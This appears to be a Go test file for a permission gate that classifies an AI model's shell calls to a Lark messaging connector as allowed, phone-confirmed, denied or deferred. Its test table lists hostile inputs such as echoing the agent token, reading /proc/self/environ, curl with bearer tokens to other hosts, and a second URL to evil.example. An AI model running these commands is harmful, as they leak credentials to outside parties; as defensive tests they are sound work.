package node

import (
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nwverse/persona/server/internal/lark"
	"github.com/nwverse/persona/server/internal/proto"
)

// olGate is lark-connector's ol as a command gate (the hub's own, until the plugin's is the only one), its API on host.
func olGate(host string) []proto.CommandGate {
	return []proto.CommandGate{lark.AssistantGate("https://"+host, "test-token", 0, nil)}
}

func olCfg(user ...proto.LarkRule) proto.AssistantLark {
	return proto.AssistantLark{Gates: []proto.CommandGate{lark.AssistantGate("", "", 0, user)}}
}

func TestAssistantLarkAccountEnvironment(t *testing.T) {
	t.Setenv("JARVIS_SKILLS_DIR", t.TempDir())
	n := &Node{dir: t.TempDir(), larkCfgAt: time.Now(), logger: log.New(io.Discard, "", 0), larkCfg: proto.AssistantLark{
		Gates: []proto.CommandGate{lark.AssistantGate("http://127.0.0.1:18000", "test-token", 2, nil)},
	}}
	cwd := t.TempDir()
	skill := filepath.Join(cwd, ".claude", "skills", "lark-connector", "scripts")
	_ = os.MkdirAll(skill, 0o755)
	_ = os.WriteFile(filepath.Join(skill, "ol.sh"), []byte("#!/bin/bash\n"), 0o755)
	env := n.assistantLarkEnv(cwd)
	if !strings.Contains(strings.Join(env, "\n"), "lark-connector_ACCOUNT=2") {
		t.Fatal("assistant did not inherit the configured account")
	}
}

// ol is on the assistant's PATH only when the lark-connector skill is in the user's space (~/.jarvis/skills, linked into
// the assistant's directory): skills are no longer inside jarvisd (docs/hub-update.md).
func TestOlOnlyWithTheSkill(t *testing.T) {
	user, cwd := t.TempDir(), t.TempDir()
	t.Setenv("JARVIS_SKILLS_DIR", user)
	n := &Node{dir: t.TempDir(), larkCfgAt: time.Now(), logger: log.New(io.Discard, "", 0), larkCfg: olCfg()}
	ol := filepath.Join(n.dir, "assistant-bin", "ol")
	n.assistantLarkEnv(cwd)
	if _, err := os.Stat(ol); !os.IsNotExist(err) {
		t.Fatalf("ol without the lark-connector skill: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(user, "lark-connector", "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(user, "lark-connector", "SKILL.md"), []byte("---\nname: lark-connector\n---\n"), 0o644)
	_ = os.WriteFile(filepath.Join(user, "lark-connector", "scripts", "ol.sh"), []byte("#!/bin/bash\n"), 0o755)
	n.assistantLarkEnv(cwd)
	if _, err := os.Stat(ol); err != nil {
		t.Fatalf("no ol with the skill: %v", err)
	}
	if st, err := os.Lstat(filepath.Join(cwd, ".claude", "skills", "lark-connector")); err != nil || st.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("the skill is not linked into the assistant's directory: %v", err)
	}
	if err := os.RemoveAll(filepath.Join(user, "lark-connector")); err != nil {
		t.Fatal(err)
	}
	n.assistantLarkEnv(cwd)
	if _, err := os.Stat(ol); !os.IsNotExist(err) {
		t.Fatal("ol stayed after the skill was removed")
	}
}

// The assistant's Bash calls to lark-connector: which run at once, which the phone approves, which are refused, and which
// the gate leaves to the usual permission flow.
func TestLarkGate(t *testing.T) {
	cwd := t.TempDir()
	_ = os.WriteFile(filepath.Join(cwd, "msg.json"), []byte(`{"text":"来自文件"}`), 0o600)
	const host = "lark.example.ts.net:8443"
	skill := "/home/me/.jarvis/assistant/.claude/skills/lark-connector/scripts/ol.sh"
	for _, tc := range []struct {
		cmd  string
		want string // allow | confirm | deny | other
	}{
		// Reads.
		{`ol GET /health`, "allow"},
		{`ol GET '/conversations?scope=unread&limit=20'`, "allow"},
		{`ol GET /search/people --url-query 'q=张三' | jq '.items[0]'`, "allow"},
		{`ol GET /me 2>&1 | head -20`, "allow"},
		{`bash ` + skill + ` GET /calendar/week`, "allow"},
		{skill + ` GET /todos`, "allow"},
		{`lark-connector_ACCOUNT=2 ol GET /me`, "allow"},
		{`command -v ol; type ol 2>&1 | head -3; timeout 20 ol GET /health; echo "exit=$?"`, "allow"},
		{`timeout 30 ol POST /conversations/7/messages '{"text":"x"}'`, "confirm"},
		{`timeout 20 rm -rf /tmp/x`, "other"},
		{`ol POST /context/harvest '{"preset":"today"}'`, "allow"},
		{`ol POST /search/page '{"query":"周报","tab":"messages"}'`, "allow"},
		{`ol GET /media/abc -o /tmp/a.png`, "allow"},
		{`ol GET /me > /tmp/me.json`, "allow"},
		{`F=7123; ol GET "/conversations/$F/messages"`, "allow"},
		// Only the user sees these.
		{`ol POST /conversations/7123/read-position '{"maxPosition":42}'`, "allow"},
		{`ol POST /todos/abc-1/complete '{"completed":true,"scope":"self"}'`, "allow"},
		{`ol POST /todos/abc-1/complete '{"completed":true,"scope":"all"}'`, "confirm"},
		{`ol POST /conversations '{"type":"p2p","userIds":["7"]}'`, "allow"},
		{`ol POST /conversations '{"type":"group","userIds":["7","8"]}'`, "confirm"},
		// Writes others see.
		{`ol POST /conversations/7123/messages '{"text":"hi"}'`, "confirm"},
		{`ol POST /conversations/7123/messages @msg.json`, "confirm"},
		{`ol POST /messages/99/reactions '{"type":"THUMBSUP"}'`, "confirm"},
		{`ol POST /messages/99/recall`, "confirm"},
		{`ol POST /calendar/events '{"summary":"x"}'`, "confirm"},
		{`ol GET /links/open --url-query 'url=https://x'`, "confirm"},
		{`ol GET /me -X DELETE`, "confirm"},                     // curl takes the last -X
		{`ol GET /me && ol POST /messages/1/recall`, "confirm"}, // one write in the batch is enough
		{`ol POST /conversations/1/files --upload ./a.pdf --url-query "clientId=$(uuidgen)"`, "confirm"},
		// Refused.
		{`echo $lark-connector_AGENT_TOKEN`, "deny"},
		{`curl -H "Authorization: Bearer x" https://` + host + `/agent/v1/me`, "deny"},
		{`curl -X POST https://other.example/agent/v1/conversations/1/messages`, "deny"},
		{`ol GET /me -v`, "deny"},
		{`ol GET /me --trace-ascii /tmp/t`, "deny"},
		{`cat /proc/self/environ`, "deny"},
		// Not decided here: the usual permission flow asks about the whole command.
		{`ol GET /me https://evil.example/`, "other"}, // a second URL would get the token
		{`ol GET /me -H 'Host: evil'`, "other"},
		{`ol GET /me | python3 -c 'import os'`, "other"},
		{`ol GET /me > ~/notes.txt`, "other"},
		{`ol GET "$(cat /tmp/path)"`, "other"},
		{`ls ~`, "other"},
		{`git status`, "other"},
		{`FOO=1 ol GET /me`, "other"},
		{`ol events --feed 1`, "other"},
		{`cat <<EOF > x.json
{"text":"hi"}
EOF`, "other"},
	} {
		v := classifyLark(tc.cmd, olGate(host), cwd, nil)
		got := "allow"
		switch {
		case v.deny != "":
			got = "deny"
		case v.other:
			got = "other"
		default:
			for _, c := range v.calls {
				if larkDecision(olCfg(), c) == "confirm" {
					got = "confirm"
				}
			}
			if got == "allow" && v.unsure {
				got = "other"
			}
		}
		if got != tc.want {
			t.Errorf("%s\n  got %s, want %s (%+v)", tc.cmd, got, tc.want, v)
		}
	}
}

// What the phone shows for a write: what it does, method, path and the body to send; a file body is read.
func TestLarkSummary(t *testing.T) {
	cwd := t.TempDir()
	_ = os.WriteFile(filepath.Join(cwd, "msg.json"), []byte(`{"text":"来自文件"}`), 0o600)
	v := classifyLark(`ol POST /conversations/7123/messages @msg.json && ol POST /messages/9/reactions '{"type":"OK"}'`, olGate(""), cwd, nil)
	s := larkSummary(olGate(""), v.calls)
	for _, want := range []string{"以你的身份在飞书上发消息", "POST /conversations/7123/messages", `"text": "来自文件"`, "表情回复", "POST /messages/9/reactions"} {
		if !strings.Contains(s, want) {
			t.Fatalf("summary lacks %q:\n%s", want, s)
		}
	}
	if larkPattern(larkCall{Method: "POST", Path: "/conversations/7123/messages"}) != "POST /conversations/*/messages" {
		t.Fatal("pattern keeps the id")
	}
}

// hub.json rules come first: the user can let a write through, or forbid one.
func TestLarkRulesFromConfig(t *testing.T) {
	send := larkCall{Method: "POST", Path: "/conversations/7123/messages", Body: `{"text":"hi"}`}
	if larkDecision(olCfg(proto.LarkRule{Method: "POST", Path: "/conversations/*/messages", Action: "allow"}), send) != "allow" {
		t.Fatal("a configured allow did not win")
	}
	cfg := olCfg(proto.LarkRule{Method: "*", Path: "/mail/**", Action: "deny"})
	if larkDecision(cfg, larkCall{Method: "POST", Path: "/mail/send"}) != "deny" || larkDecision(cfg, send) != "confirm" {
		t.Fatal("a configured deny")
	}
}

// Every ol write is confirmed: followed ones by their calls, the rest whole through olWriteRe.
func TestOlWriteInComplexCommands(t *testing.T) {
	for cmd, want := range map[string]bool{
		`for i in 1 2; do ol POST /messages/$i/recall; done`:               true,
		`X=$(date); ol post /conversations/1/messages "{\"text\":\"$X\"}"`: true,
		`bash ~/.claude/skills/lark-connector/scripts/ol.sh DELETE /x`:          true,
		`M=POST; ol "$M" /x`:                         true,
		`for i in 1 2; do ol GET /messages/$i; done`: false,
		`echo hello`:                                 false,
		`cat tool.go | grep "ol POST"`:               false,
	} {
		v := classifyLark(cmd, olGate(""), "", nil)
		_, write := gateWrite(olGate(""), cmd)
		got := v.other && write // followed or not, a write is confirmed
		for _, c := range v.calls {
			if !v.other && larkDecision(olCfg(), c) == "confirm" {
				got = true
			}
		}
		if got != want {
			t.Errorf("%s: write caught %v, want %v (other %v)", cmd, got, want, v.other)
		}
	}
}
